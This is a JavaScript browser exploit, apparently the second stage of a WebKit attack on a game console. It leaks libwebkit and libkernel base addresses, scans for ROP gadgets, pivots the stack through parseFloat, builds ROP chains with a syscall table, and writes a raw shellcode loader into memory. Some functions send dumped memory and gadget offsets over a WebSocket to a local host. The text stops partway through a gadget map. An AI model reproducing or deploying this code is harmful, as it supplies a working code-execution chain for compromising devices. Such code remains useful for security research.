var p;
var xhr_sync_log = function(str) {
    var req = new XMLHttpRequest();
    req.open('GET', url , false);
    req.send(null);
}
var findModuleBaseXHR = function(addr)
{
    var addr_ = addr.add32(0); // copy
    addr_.low &= 0xFFFFF000;
    xhr_sync_log("START: " + addr_);
    
    while (1) {
        var vr = p.read4(addr_.add32(0x110-4));
        xhr_sync_log("step" + addr_);
        addr_.sub32inplace(0x1000);
    }
}
var log = function(x) {
    document.getElementById("console").innerText += x + "\n";
}
var print = function(string) { // like log but html
    document.getElementById("console").innerHTML += string + "\n";
}

var dumpModuleXHR = function(moduleBase) {
    var chunk = new ArrayBuffer(0x1000);
    var chunk32 = new Uint32Array(chunk);
    var chunk8 = new Uint8Array(chunk);
    connection = new WebSocket('ws://10.17.0.1:8080');
    connection.binaryType = "arraybuffer";
    var helo = new Uint32Array(1);
    helo[0] = 0x41414141;
    
    var moduleBase_ = moduleBase.add32(0);
    connection.onmessage = function() {
        try {
            for (var i = 0; i < chunk32.length; i++)
            {
                var val = p.read4(moduleBase_);
                chunk32[i] = val;
                moduleBase_.add32inplace(4);
            }
            connection.send(chunk8);
        } catch (e) {
            print(e);
        }
    }
}
var get_jmptgt = function(addr)
{
    var z=p.read4(addr) & 0xFFFF;
    var y=p.read4(addr.add32(2));
    if (z != 0x25ff) return 0;
    
    return addr.add32(y+6);
    
}
var gadgetmap_wk = {
    "ep": [0x5B, 0x41, 0x5C, 0x41, 0x5D, 0x41, 0x5E, 0x41, 0x5F, 0x5D, 0xC3],
        /*
        0:  5b                      pop    rbx
        1:  41 5c                   pop    r12
        3:  41 5d                   pop    r13
        5:  41 5e                   pop    r14
        7:  41 5f                   pop    r15
        9:  5d                      pop    rbp
        a:  c3                      ret
    */
    "pop rsi": [0x5E, 0xC3],
    "pop rdi": [0x5F, 0xC3],
    "pop rsp": [0x5c, 0xC3],
    "pop rax": [0x58, 0xC3],
    "pop rdx": [0x5a, 0xC3],
    "pop rcx": [0x59, 0xC3],
    "pop rsp": [0x5c, 0xC3],
    "pop rbp": [0x5d, 0xC3],
    "pop r8": [0x47, 0x58, 0xC3],
    "pop r9": [0x47, 0x59, 0xC3],
    "infloop": [0xEB, 0xFE, 0xc3],
    "ret": [0xC3],
    "mov [rdi], rsi": [0x48, 0x89, 0x37, 0xC3],
    "mov [rax], rsi": [0x48, 0x89, 0x30, 0xC3],
    "mov [rdi], rax": [0x48, 0x89, 0x07, 0xC3],
    "mov rxa, rdi": [0x48, 0x89, 0xF8, 0xC3]
};
var slowpath_jop = [0x48, 0x8B, 0x7F, 0x48, 0x48, 0x8B, 0x07, 0x48, 0x8B, 0x40, 0x30, 0xFF, 0xE0];
            /*
            0:  48 8b 7f 48             mov    rdi,QWORD PTR [rdi+0x48]
            4:  48 8b 07                mov    rax,QWORD PTR [rdi]
            7:  48 8b 40 30             mov    rax,QWORD PTR [rax+0x30]
            b:  ff e0                   jmp    rax
            */
slowpath_jop.reverse();

var gadgets;

/*
kchain.push(window.gadgets["pop rax"]);
      kchain.push(savectx.add32(0x30));
      kchain.push(window.gadgets["mov rax, [rax]"]);
      kchain.push(window.gadgets["pop rcx"]);
      kchain.push(kernel_slide);
      kchain.push(window.gadgets["add rax, rcx"]);
      kchain.push(window.gadgets["pop rdi"]);
      kchain.push(savectx.add32(0x50));
      kchain.push(window.gadgets["mov [rdi], rax"]);
      */
gadgets = {
  "ret":                    0x0000003C,
  "jmp rax":                0x00000082,
  "ep":                     0x000000AD,
  "pop rbp":                0x000000B6,
  "mov [rdi], rax":         0x00003FBA,
  "pop r8":                 0x0000CC42,
  "pop rax":                0x0000CC43,
  "mov rax, rdi":           0x0000E84E,
  "mov rax, [rax]":         0x000130A3,
  "mov rdi, rax; jmp rcx":  0x0003447A,
  "pop rsi":                0x0007B1EE,
  "pop rdi":                0x0007B23D,
  "add rsi, rcx; jmp rsi":  0x001FA5D4,
  "pop rcx":                0x00271DE3,
  "pop rsp":                0x0027A450,
  "mov [rdi], rsi":         0x0039CF70,
  "mov [rax], rsi":         0x003D0877,
  "add rsi, rax; jmp rsi":  0x004E040C,
  "pop rdx":                0x00565838,
  "pop r9":                 0x0078BA1F,
  "add rax, rcx":           0x0084D04D,
  "jop":                    0x01277350,
  "infloop":                0x012C4009,

  "stack_chk_fail":         0x000000C8,
  "memcpy":                 0x000000F8,
  "setjmp":                 0x00001468
};
var reenter_help = { length:
    { valueOf: function(){
        return 0;
    }
}};

window.stage2 = function() {
    try {
        window.stage2_();
    } catch (e) {
        print(e);
    }
}
var gadgetcache = {"ret":60,
"ep":173,
"pop rbp":182,
"pop rax":17781,
"mov rax, rdi":23248,
"pop r8":100517,
"pop rsp":128173,
"mov [rdi], rsi":150754,
"pop rcx":169041,
"pop rdi":239071,
"pop rsi":597265,
"mov [rdi], rax":782172,
"jop":813600,
"pop rdx":1092690,
"mov [rax], rsi":2484823,
"pop r9":21430095,
"infloop":22604906},
 gadgetoffs = {};
 
window.stage2_ = function() {
    p = window.prim;
    print ("[+] exploit succeeded");
    print("webkit exploit result: " + p.leakval(0x41414141));
    print ("--- welcome to stage2 ---");
    p.leakfunc = function(func)
    {
        var fptr_store = p.leakval(func);
        return (p.read8(fptr_store.add32(0x18))).add32(0x40);
    }
    gadgetconn = 0;
    if (!gadgetcache)
        gadgetconn = new WebSocket('ws://10.17.0.1:8080');

    var parseFloatStore = p.leakfunc(parseFloat);
    var parseFloatPtr = p.read8(parseFloatStore);
    print("parseFloat at: 0x" + parseFloatPtr);
    var webKitBase = p.read8(parseFloatStore);
    window.webKitBase = webKitBase;
    
    webKitBase.low &= 0xfffff000;
    webKitBase.sub32inplace(0x5b7000-0x1C000);
    
    print("libwebkit base at: 0x" + webKitBase);
    
    var o2wk = function(o)
    {
        return webKitBase.add32(o);
    }

    gadgets = {
        "stack_chk_fail": o2wk(0xc8),
        "memset": o2wk(0x228),
        "setjmp": o2wk(0x14f8)
    };
/*
    var libSceLibcInternalBase = p.read8(get_jmptgt(gadgets['stack_chk_fail']));
    libSceLibcInternalBase.low &= ~0x3FFF;
    libSceLibcInternalBase.sub32inplace(0x20000);
    print("libSceLibcInternal: 0x" + libSceLibcInternalBase.toString());
    window.libSceLibcInternalBase = libSceLibcInternalBase;
*/

    var jmpGadget = get_jmptgt(gadgets.stack_chk_fail);
    if(!jmpGadget)
        return;

    var libKernelBase = p.read8(get_jmptgt(gadgets.stack_chk_fail));
    window.libKernelBase = libKernelBase;
    libKernelBase.low &= 0xfffff000;
    libKernelBase.sub32inplace(0x12000);
    print("libkernel_web base at: 0x" + libKernelBase);
    
    
    var o2lk = function(o)
    {
        return libKernelBase.add32(o);
    }
    window.o2lk = o2lk;
    
    var wkview = new Uint8Array(0x1000);
    var wkstr = p.leakval(wkview).add32(0x10);
    var orig_wkview_buf = p.read8(wkstr);
    
    p.write8(wkstr, webKitBase);
    p.write4(wkstr.add32(8), 0x367c000);
    
    var gadgets_to_find = 0;
    var gadgetnames = [];
    for (var gadgetname in gadgetmap_wk) {
        if (gadgetmap_wk.hasOwnProperty(gadgetname)) {
            gadgets_to_find++;
            gadgetnames.push(gadgetname);
            gadgetmap_wk[gadgetname].reverse();
        }
    }
    log("finding gadgets");
    
    gadgets_to_find++; // slowpath_jop
    var findgadget = function(donecb) {
        if (gadgetcache)
        {
            gadgets_to_find=0;
            slowpath_jop=0;
            log("using cached gadgets");
            
            for (var gadgetname in gadgetcache) {
                if (gadgetcache.hasOwnProperty(gadgetname)) {
                    gadgets[gadgetname] = o2wk(gadgetcache[gadgetname]);
                }
            }
            
        } else {
            for (var i=0; i < wkview.length; i++)
            {
                if (wkview[i] == 0xc3)
                {
                    for (var nl=0; nl < gadgetnames.length; nl++)
                    {
                        var found = 1;
                        if (!gadgetnames[nl]) continue;
                        var gadgetbytes = gadgetmap_wk[gadgetnames[nl]];
                        for (var compareidx = 0; compareidx < gadgetbytes.length; compareidx++)
                        {
                            if (gadgetbytes[compareidx] != wkview[i - compareidx]){
                                found = 0;
                                break;
                            }
                        }
                        if (!found) continue;
                        gadgets[gadgetnames[nl]] = o2wk(i - gadgetbytes.length + 1);
                        gadgetoffs[gadgetnames[nl]] = i - gadgetbytes.length + 1;
                        delete gadgetnames[nl];
                        gadgets_to_find--;
                    }
                } else if (wkview[i] == 0xe0 && wkview[i-1] == 0xff && slowpath_jop)
                {
                    var found = 1;
                    for (var compareidx = 0; compareidx < slowpath_jop.length; compareidx++)
                    {
                        if (slowpath_jop[compareidx] != wkview[i - compareidx])
                        {
                            found = 0;
                            break;
                        }
                    }
                    if (!found) continue;
                    gadgets["jop"] = o2wk(i - slowpath_jop.length + 1);
                    gadgetoffs["jop"] = i - slowpath_jop.length + 1;
                    gadgets_to_find--;
                    slowpath_jop = 0;
                }
                
                if (!gadgets_to_find) break;
            }
        }
        if (!gadgets_to_find && !slowpath_jop) {
            log("found gadgets");
            if (gadgetconn)
                gadgetconn.onopen = function(e){
                    gadgetconn.send(JSON.stringify(gadgetoffs));
                }
                setTimeout(donecb, 50);
        } else {
            log("missing gadgets: ");
            for (var nl in gadgetnames) {
                log(" - " + gadgetnames[nl]);
            }
            if(slowpath_jop) log(" - jop gadget");
        }
    }
  // Setup ROP launching
    findgadget(function(){});
    var hold1;
    var hold2;
    var holdz;
    var holdz1;

    while (1) {
      hold1 = {a:0, b:0, c:0, d:0};
      hold2 = {a:0, b:0, c:0, d:0};
      holdz1 = p.leakval(hold2);
      holdz = p.leakval(hold1);
      if (holdz.low - 0x30 == holdz1.low) break;
    }

    var pushframe = [];
    pushframe.length = 0x80;
    var funcbuf;

    var launch_chain = function(chain)
    {
      var stackPointer = 0;
      var stackCookie = 0;
      var orig_reenter_rip = 0;
        
        var reenter_help = {length: {valueOf: function(){
            orig_reenter_rip = p.read8(stackPointer);
            stackCookie = p.read8(stackPointer.add32(8));
            var returnToFrame = stackPointer;
            
            var ocnt = chain.count;
            chain.push_write8(stackPointer, orig_reenter_rip);
            chain.push_write8(stackPointer.add32(8), stackCookie);
            
            if (chain.runtime) returnToFrame=chain.runtime(stackPointer);
            
            chain.push(gadgets["pop rsp"]); // pop rsp
            chain.push(returnToFrame); // -> back to the trap life
            chain.count = ocnt;
            
            p.write8(stackPointer, (gadgets["pop rsp"])); // pop rsp
            p.write8(stackPointer.add32(8), chain.ropframeptr); // -> rop frame
        }}};
        
        var funcbuf32 = new Uint32Array(0x100);
        nogc.push(funcbuf32);
        funcbuf = p.read8(p.leakval(funcbuf32).add32(0x10));
        
        p.write8(funcbuf.add32(0x30), gadgets["setjmp"]);
        p.write8(funcbuf.add32(0x80), gadgets["jop"]);
        p.write8(funcbuf,funcbuf);
        p.write8(parseFloatStore, gadgets["jop"]);
        var orig_hold = p.read8(holdz1);
        var orig_hold48 = p.read8(holdz1.add32(0x48));
        
        p.write8(holdz1, funcbuf.add32(0x50));
        p.write8(holdz1.add32(0x48), funcbuf);
        parseFloat(hold2,hold2,hold2,hold2,hold2,hold2);
        p.write8(holdz1, orig_hold);
        p.write8(holdz1.add32(0x48), orig_hold48);
        
        stackPointer = p.read8(funcbuf.add32(0x10));
        rtv=Array.prototype.splice.apply(reenter_help);
        return p.leakval(rtv);
    }
    
    
    gadgets = gadgets;
    p.loadchain = launch_chain;
    
     // Write to address with value (helper function)
  this.write64 = function (addr, val) {
    this.push(window.gadgets["pop rdi"]);
    this.push(addr);
    this.push(window.gadgets["pop rax"]);
    this.push(val);
    this.push(window.gadgets["mov [rdi], rax"]);
  }
    
    window.RopChain = function () {
        this.ropframe = new Uint32Array(0x10000);
        this.ropframeptr = p.read8(p.leakval(this.ropframe).add32(0x10));
        this.count = 0;
        this.clear = function() {
            this.count = 0;
            this.runtime = undefined;
            for (var i = 0; i < 0x1000/8; i++)
            {
                p.write8(this.ropframeptr.add32(i*8), 0);
            }
        };
        this.pushSymbolic = function() {
            this.count++;
            return this.count-1;
        }
        this.finalizeSymbolic = function(idx, val) {
            p.write8(this.ropframeptr.add32(idx*8), val);
        }
        this.push = function(val) {
            this.finalizeSymbolic(this.pushSymbolic(), val);
        }
        this.push_write8 = function(where, what)
        {
            this.push(gadgets["pop rdi"]); // pop rdi
            this.push(where); // where
            this.push(gadgets["pop rsi"]); // pop rsi
            this.push(what); // what
            this.push(gadgets["mov [rdi], rsi"]); // perform write
        }
        this.fcall = function (rip, rdi, rsi, rdx, rcx, r8, r9)
        {
            this.push(gadgets["pop rdi"]); // pop rdi
            this.push(rdi); // what
            this.push(gadgets["pop rsi"]); // pop rsi
            this.push(rsi); // what
            this.push(gadgets["pop rdx"]); // pop rdx
            this.push(rdx); // what
            this.push(gadgets["pop rcx"]); // pop r10
            this.push(rcx); // what
            this.push(gadgets["pop r8"]); // pop r8
            this.push(r8); // what
            this.push(gadgets["pop r9"]); // pop r9
            this.push(r9); // what
            this.push(rip); // jmp
            return this;
        }
        
        this.run = function() {
            var retv = p.loadchain(this, this.notimes);
            this.clear();
            return retv;
        }
        
        return this;
    };
    
    var RopChain = window.RopChain();
    window.syscallnames = {"exit": 1,
    "fork": 2,
    "read": 3,
    "write": 4,
    "open": 5,
    "close": 6,
    "wait4": 7,
    "unlink": 10,
    "chdir": 12,
    "chmod": 15,
    "getpid": 20,
    "setuid": 23,
    "getuid": 24,
    "geteuid": 25,
    "recvmsg": 27,
    "sendmsg": 28,
    "recvfrom": 29,
    "accept": 30,
    "getpeername": 31,
    "getsockname": 32,
    "access": 33,
    "chflags": 34,
    "fchflags": 35,
    "sync": 36,
    "kill": 37,
    "stat": 38,
    "getppid": 39,
    "dup": 41,
    "pipe": 42,
    "getegid": 43,
    "profil": 44,
    "getgid": 47,
    "getlogin": 49,
    "setlogin": 50,
    "sigaltstack": 53,
    "ioctl": 54,
    "reboot": 55,
    "revoke": 56,
    "execve": 59,
    "execve": 59,
    "msync": 65,
    "munmap": 73,
    "mprotect": 74,
    "madvise": 75,
    "mincore": 78,
    "getgroups": 79,
    "setgroups": 80,
    "setitimer": 83,
    "getitimer": 86,
    "getdtablesize": 89,
    "dup2": 90,
    "fcntl": 92,
    "select": 93,
    "fsync": 95,
    "setpriority": 96,
    "socket": 97,
    "connect": 98,
    "accept": 99,
    "getpriority": 100,
    "send": 101,
    "recv": 102,
    "bind": 104,
    "setsockopt": 105,
    "listen": 106,
    "recvmsg": 113,
    "sendmsg": 114,
    "gettimeofday": 116,
    "getrusage": 117,
    "getsockopt": 118,
    "readv": 120,
    "writev": 121,
    "settimeofday": 122,
    "fchmod": 124,
    "recvfrom": 125,
    "setreuid": 126,
    "setregid": 127,
    "rename": 128,
    "flock": 131,
    "sendto": 133,
    "shutdown": 134,
    "socketpair": 135,
    "mkdir": 136,
    "rmdir": 137,
    "utimes": 138,
    "adjtime": 140,
    "getpeername": 141,
    "setsid": 147,
    "sysarch": 165,
    "setegid": 182,"seteuid": 183,
    "stat": 188,
    "fstat": 189,
    "lstat": 190,
    "pathconf": 191,
    "fpathconf": 192,
    "getrlimit": 194,
    "setrlimit": 195,
    "getdirentries": 196,
    "__sysctl": 202,
    "mlock": 203,
    "munlock": 204,
    "futimes": 206,
    "poll": 209,
    "clock_gettime": 232,
    "clock_settime": 233,
    "clock_getres": 234,
    "ktimer_create": 235,
    "ktimer_delete": 236,
    "ktimer_settime": 237,
    "ktimer_gettime": 238,
    "ktimer_getoverrun": 239,
    "nanosleep": 240,
    "rfork": 251,
    "issetugid": 253,
    "getdents": 272,
    "preadv": 289,
    "pwritev": 290,
    "getsid": 310,
    "aio_suspend": 315,
    "mlockall": 324,
    "munlockall": 325,
    "sched_setparam": 327,
    "sched_getparam": 328,
    "sched_setscheduler": 329,
    "sched_getscheduler": 330,
    "sched_yield": 331,
    "sched_get_priority_max": 332,
    "sched_get_priority_min": 333,
    "sched_rr_get_interval": 334,
    "utrace": 335,
    "sigprocmask": 340,
    "sigsuspend": 341,
    "sigpending": 343,
    "sigtimedwait": 345,
    "sigwaitinfo": 346,
    "kqueue": 362,
    "kevent": 363,
    "uuidgen": 392,
    "sendfile": 393,
    "fstatfs": 397,
    "ksem_close": 400,
    "ksem_post": 401,
    "ksem_wait": 402,
    "ksem_trywait": 403,
    "ksem_init": 404,
    "ksem_open": 405,
    "ksem_unlink": 406,
    "ksem_getvalue": 407,
    "ksem_destroy": 408,
    "sigaction": 416,
    "sigreturn": 417,
    "getcontext": 421,
    "setcontext": 422,
    "swapcontext": 423,
    "sigwait": 429,
    "thr_create": 430,
    "thr_exit": 431,
    "thr_self": 432
    ,"thr_kill": 433,
    "ksem_timedwait": 441,
    "thr_suspend": 442,
    "thr_wake": 443,
    "kldunloadf": 444,
    "_umtx_op": 454,
    "thr_new": 455,
    "sigqueue": 456,
    "thr_set_name": 464,
    "rtprio_thread": 466,
    "pread": 475,
    "pwrite": 476,
    "mmap": 477,
    "lseek": 478,
    "truncate": 479,
    "ftruncate": 480,
    "thr_kill2": 481,
    "shm_open": 482,
    "shm_unlink": 483,
    "cpuset_getid": 486,
    "cpuset_getaffinity": 487,
    "cpuset_setaffinity": 488,
    "openat": 499,
    "pselect": 522,  
    "regmgr_call": 532,
    "jitshm_create": 533,
    "jitshm_alias": 534,
    "dl_get_list": 535,
    "dl_get_info": 536,
    "dl_notify_event": 537,
    "evf_create": 538,
    "evf_delete": 539,
    "evf_open": 540,
    "evf_close": 541,
    "evf_wait": 542,
    "evf_trywait": 543,
    "evf_set": 544,
    "evf_clear": 545,
    "evf_cancel": 546,
    "query_memory_protection": 47,
    "batch_map": 548,
    "osem_create": 549,
    "osem_delete": 550,
    "osem_open": 551,
    "osem_close": 552,
    "osem_wait": 553,
    "osem_trywait": 554,
    "osem_post": 555,
    "sys_osem_cancel": 556,
    "namedobj_create": 557,
    "namedobj_delete": 558,
    "set_vm_container": 559,
    "debug_init": 560,
    "suspend_process": 561,
    "resume_process": 562,
    "opmc_enable": 563,
    "opmc_disable": 564,
    "opmc_set_ctl": 565,
    "opmc_set_ctr": 566,
    "opmc_get_ctr": 567,
    "budget_create": 568,
    "budget_delete": 569,
    "budget_get": 570,
    "budget_set": 571,
    "virtual_query": 572,
    "mdbg_call": 573,
    "sblock_create": 574,
    "sys_sblock_delete": 575,
    "sblock_enter": 576,
    "sblock_exit": 577,
    "sblock_xenter": 578,
    "sblock_xexit": 579,
    "eport_create": 580,
    "eport_delete": 581,
    "eport_trigger": 582,
    "eport_open": 583,
    "eport_close": 584,
    "is_in_sandbox": 585,
    "dmem_container": 586,
    "get_authinfo": 587,
    "mname": 588,
    "dynlib_dlopen": 589,
    "dynlib_dlclose": 590,
    "dynlib_dlsym": 591,
    "dynlib_get_list": 592,
    "dynlib_get_info": 593,
    "dynlib_load_prx": 594,
    "dynlib_unload_prx": 595,
    "dynlib_do_copy_relocations": 596,
    "dynlib_prepare_dlclose": 597,
    "dynlib_get_proc_param": 598,
    "dynlib_process_needed_and_relocate": 599,
    "sandbox_path": 600,
    "mdbg_service": 601,
    "randomized_path": 602,
    "rdup": 603,
    "dl_get_metadata": 604,
    "workaround8849": 605,
    "is_development_mode": 606,
    "get_self_auth_info": 607,
    "dynlib_get_info_ex": 608,
    "budget_get_ptype": 610,
    "budget_getid": 609,
    "get_paging_stats_of_all_threads": 611,
    "get_proc_type_info": 612,
    "get_resident_count": 613,
    "prepare_to_suspend_process": 614,
    "get_resident_fmem_count": 615,
    "thr_get_name": 616,
    "set_gpo": 617,
    "thr_suspend_ucontext": 632,
    "thr_resume_ucontext": 633,
    "thr_get_ucontext": 634}    


        function swapkeyval(json){
        var ret = {};
        for(var key in json){
            if (json.hasOwnProperty(key)) {
                ret[json[key]] = key;
            }
        }
        return ret;
    }
    
    window.nameforsyscall = swapkeyval(window.syscallnames);
    
    window.syscalls = {};
         function ping(url) {
    "use strict";
    var xhr = new XMLHttpRequest();
    xhr.open("GET", url, false);
    xhr.send(null);
}

/* Simply adds given offset to given module's base address */
function getGadget(moduleName, offset) {
    return add2(window.ECore.moduleBaseAddresses[moduleName], offset);
}
    function writeLoader(p, addr) {
	p.write4(addr.add32(0x00000000), 0x00000be9);
	p.write4(addr.add32(0x00000004), 0x0f2e6600);
	p.write4(addr.add32(0x00000008), 0x0000841f);
	p.write4(addr.add32(0x0000000C), 0x90000000);
	p.write4(addr.add32(0x00000010), 0x54415541);
	p.write4(addr.add32(0x00000014), 0x83485355);
	p.write4(addr.add32(0x00000018), 0xd23118ec);
	p.write4(addr.add32(0x0000001C), 0x000001be);
	p.write4(addr.add32(0x00000020), 0x0002bf00);
	p.write4(addr.add32(0x00000024), 0x04c60000);
	p.write4(addr.add32(0x00000028), 0xb8481024);
	p.write4(addr.add32(0x0000002C), 0x2610012f);
	p.write4(addr.add32(0x00000030), 0x00000009);
	p.write4(addr.add32(0x00000034), 0x012444c6);
	p.write4(addr.add32(0x00000038), 0x08bc4902);
	p.write4(addr.add32(0x0000003C), 0x09261001);
	p.write4(addr.add32(0x00000040), 0xc7000000);
	p.write4(addr.add32(0x00000044), 0x00042444);
	p.write4(addr.add32(0x00000048), 0x66000000);
	p.write4(addr.add32(0x0000004C), 0x022444c7);
	p.write4(addr.add32(0x00000050), 0x44c63c23);
	p.write4(addr.add32(0x00000054), 0xc6000a24);
	p.write4(addr.add32(0x00000058), 0x000b2444);
	p.write4(addr.add32(0x0000005C), 0x0c2444c6);
	p.write4(addr.add32(0x00000060), 0x2444c600);
	p.write4(addr.add32(0x00000064), 0x44c6000d);
	p.write4(addr.add32(0x00000068), 0xc6000e24);
	p.write4(addr.add32(0x0000006C), 0x000f2444);
	p.write4(addr.add32(0x00000070), 0x10bad0ff);
	p.write4(addr.add32(0x00000074), 0x48000000);
	p.write4(addr.add32(0x00000078), 0x8941e689);
	p.write4(addr.add32(0x0000007C), 0x48c789c5);
	p.write4(addr.add32(0x00000080), 0x10013cb8);
	p.write4(addr.add32(0x00000084), 0x00000926);
	p.write4(addr.add32(0x00000088), 0xbed0ff00);
	p.write4(addr.add32(0x0000008C), 0x0000000a);
	p.write4(addr.add32(0x00000090), 0x48ef8944);
	p.write4(addr.add32(0x00000094), 0x100149b8);
	p.write4(addr.add32(0x00000098), 0x00000926);
	p.write4(addr.add32(0x0000009C), 0x31d0ff00);
	p.write4(addr.add32(0x000000A0), 0x44f631d2);
	p.write4(addr.add32(0x000000A4), 0xb848ef89);
	p.write4(addr.add32(0x000000A8), 0x26100122);
	p.write4(addr.add32(0x000000AC), 0x00000009);
	p.write4(addr.add32(0x000000B0), 0xc589d0ff);
	p.write4(addr.add32(0x000000B4), 0x0000b848);
	p.write4(addr.add32(0x000000B8), 0x00092620);
	p.write4(addr.add32(0x000000BC), 0x00c60000);
	p.write4(addr.add32(0x000000C0), 0xc38948c3);
	p.write4(addr.add32(0x000000C4), 0x906607eb);
	p.write4(addr.add32(0x000000C8), 0x01489848);
	p.write4(addr.add32(0x000000CC), 0x1000bac3);
	p.write4(addr.add32(0x000000D0), 0x89480000);
	p.write4(addr.add32(0x000000D4), 0x41ef89de);
	p.write4(addr.add32(0x000000D8), 0xc085d4ff);
	p.write4(addr.add32(0x000000DC), 0x8944ea7f);
	p.write4(addr.add32(0x000000E0), 0x15bb48ef);
	p.write4(addr.add32(0x000000E4), 0x09261001);
	p.write4(addr.add32(0x000000E8), 0xff000000);
	p.write4(addr.add32(0x000000EC), 0xffef89d3);
	p.write4(addr.add32(0x000000F0), 0x00b848d3);
	p.write4(addr.add32(0x000000F4), 0x09262000);
	p.write4(addr.add32(0x000000F8), 0xff000000);
	p.write4(addr.add32(0x000000FC), 0xc48348d0);
	p.write4(addr.add32(0x00000100), 0x415d5b18);
	p.write4(addr.add32(0x00000104), 0xc35d415c);
	p.write4(addr.add32(0x00000108), 0x03c0c748);
	p.write4(addr.add32(0x0000010C), 0x49000000);
	p.write4(addr.add32(0x00000110), 0x050fca89);
	p.write4(addr.add32(0x00000114), 0xc0c748c3);
	p.write4(addr.add32(0x00000118), 0x00000006);
	p.write4(addr.add32(0x0000011C), 0x0fca8949);
	p.write4(addr.add32(0x00000120), 0xc748c305);
	p.write4(addr.add32(0x00000124), 0x00001ec0);
	p.write4(addr.add32(0x00000128), 0xca894900);
	p.write4(addr.add32(0x0000012C), 0x48c3050f);
	p.write4(addr.add32(0x00000130), 0x0061c0c7);
	p.write4(addr.add32(0x00000134), 0x89490000);
	p.write4(addr.add32(0x00000138), 0xc3050fca);
	p.write4(addr.add32(0x0000013C), 0x68c0c748);
	p.write4(addr.add32(0x00000140), 0x49000000);
	p.write4(addr.add32(0x00000144), 0x050fca89);
	p.write4(addr.add32(0x00000148), 0xc0c748c3);
	p.write4(addr.add32(0x0000014C), 0x0000006a);
	p.write4(addr.add32(0x00000150), 0x0fca8949);
	p.write4(addr.add32(0x00000154), 0x0000c305);
	p.write4(addr.add32(0x00000158), 0x00000014);
	p.write4(addr.add32(0x0000015C), 0x00000000);
	p.write4(addr.add32(0x00000160), 0x00527a01);
	p.write4(addr.add32(0x00000164), 0x01107801);
	p.write4(addr.add32(0x00000168), 0x08070c1b);
	p.write4(addr.add32(0x0000016C), 0x00000190);
	p.write4(addr.add32(0x00000170), 0x00000034);
	p.write4(addr.add32(0x00000174), 0x0000001c);
	p.write4(addr.add32(0x00000178), 0xfffffe98);
	p.write4(addr.add32(0x0000017C), 0x000000f8);
	p.write4(addr.add32(0x00000180), 0x100e4200);
	p.write4(addr.add32(0x00000184), 0x0e42028d);
	p.write4(addr.add32(0x00000188), 0x41038c18);
	p.write4(addr.add32(0x0000018C), 0x0486200e);
	p.write4(addr.add32(0x00000190), 0x83280e41);
	p.write4(addr.add32(0x00000194), 0x400e4405);
	p.write4(addr.add32(0x00000198), 0x280ee702);
	p.write4(addr.add32(0x0000019C), 0x41200e41);
	p.write4(addr.add32(0x000001A0), 0x0e42180e);
	p.write4(addr.add32(0x000001A4), 0x080e4210);
	p.write4(addr.add32(0x000001A8), 0x3b031b01);
	p.write4(addr.add32(0x000001AC), 0xffffffac);
	p.write4(addr.add32(0x000001B0), 0x00000001);
	p.write4(addr.add32(0x000001B4), 0xfffffe68);
	p.write4(addr.add32(0x000001B8), 0xffffffc8);
}

/* All function stubs / imports from other modules */
var BasicImportMap = function() {
    window.basicImportMap = {
        '5.50': {
            'setjmp': getGadget('libSceWebKit2', 0x14F8), // setjmp imported from libkernel
            '__stack_chk_fail_ptr': getGadget('libSceWebKit2', 0x384BA40), // pointer to pointer to stack_chk_fail imported from libkernel -> look at epilogs to find this
            "sceKernelLoadStartModule": getGadget('libkernel', 0x31470), // dump libkernel using the stack_chk_fail pointer to find base, then look for _sceKernelLoadStartModule
        }
    };
}

/* All gadgets from the binary of available modules */
var GadgetMap = function() {
    window.gadgetMap = {
        '5.01': {
            'pop rsi': getGadget('libSceWebKit2', 0x0008f38a), // 0x000000000008f38a : pop rsi ; ret // 5ec3
            'pop rdi': getGadget('libSceWebKit2', 0x00038dba), // pop rdi ; ret
            'pop rax': getGadget('libSceWebKit2', 0x000043f5), // pop rax ; ret
            'pop rcx': getGadget('libSceWebKit2', 0x00052e59), // pop rcx ; ret
            'pop rdx': getGadget('libSceWebKit2', 0x000dedc2), // pop rdx ; ret
            'pop r8': getGadget('libSceWebKit2', 0x000179c5), // pop r8 ; ret
            'pop r9': getGadget('libSceWebKit2', 0x00bb30cf), // pop r9 ; ret
            'pop rsp': getGadget('libSceWebKit2', 0x0001e687), // pop rsp ; ret
            'push rax': getGadget('libSceWebKit2', 0x0017778e), // push rax ; ret  ;
            'mov rax, rdi': getGadget('libSceWebKit2', 0x000058d0), // mov rax, rdi ; ret
            'mov rax, rdx': getGadget('libSceWebKit2', 0x001cee60), // 0x00000000001cee60 : mov rax, rdx ; ret // 4889d0c3
            'add rax, rcx': getGadget('libSceWebKit2', 0x00015172), // add rax, rcx ; ret
            'mov qword ptr [rdi], rax': getGadget('libSceWebKit2', 0x0014536b), // mov qword ptr [rdi], rax ; ret 
            'mov qword ptr [rdi], rsi': getGadget('libSceWebKit2', 0x00023ac2), // mov qword ptr [rdi], rsi ; ret
            'mov rax, qword ptr [rax]': getGadget('libSceWebKit2', 0x0006c83a), // mov rax, qword ptr [rax] ; ret
            'ret': getGadget('libSceWebKit2', 0x0000003c), // ret  ;
            'nop': getGadget('libSceWebKit2', 0x00002f8f), // 0x0000000000002f8f : nop ; ret // 90c3

            'syscall': getGadget('libSceWebKit2', 0x2264DBC), // syscall  ; ret

            'jmp rax': getGadget('libSceWebKit2', 0x00000082), // jmp rax ;
            'jmp r8': getGadget('libSceWebKit2', 0x00201860), // jmp r8 ;
            'jmp r9': getGadget('libSceWebKit2', 0x001ce976), // jmp r9 ;
            'jmp r11': getGadget('libSceWebKit2', 0x0017e73a), // jmp r11 ;
            'jmp r15': getGadget('libSceWebKit2', 0x002f9f6d), // jmp r15 ;
            'jmp rbp': getGadget('libSceWebKit2', 0x001fb8bd), // jmp rbp ;
            'jmp rbx': getGadget('libSceWebKit2', 0x00039bd2), // jmp rbx ;
            'jmp rcx': getGadget('libSceWebKit2', 0x0000dee3), // jmp rcx ;
            'jmp rdi': getGadget('libSceWebKit2', 0x000b479c), // jmp rdi ;
            'jmp rdx': getGadget('libSceWebKit2', 0x0000e3d0), // jmp rdx ;
            'jmp rsi': getGadget('libSceWebKit2', 0x0002e004), // jmp rsi ;
            'jmp rsp': getGadget('libSceWebKit2', 0x0029e6ad), // jmp rsp ;

            // 0x013d1a00 : mov rdi, qword ptr [rdi] ; mov rax, qword ptr [rdi] ; mov rax, qword ptr [rax] ; jmp rax // 488b3f488b07488b00ffe0   
            // 0x00d65230: mov rdi, qword [rdi+0x18] ; mov rax, qword [rdi] ; mov rax, qword [rax+0x58] ; jmp rax ;  // 48 8B 7F 18 48 8B 07 48  8B 40 58 FF E0
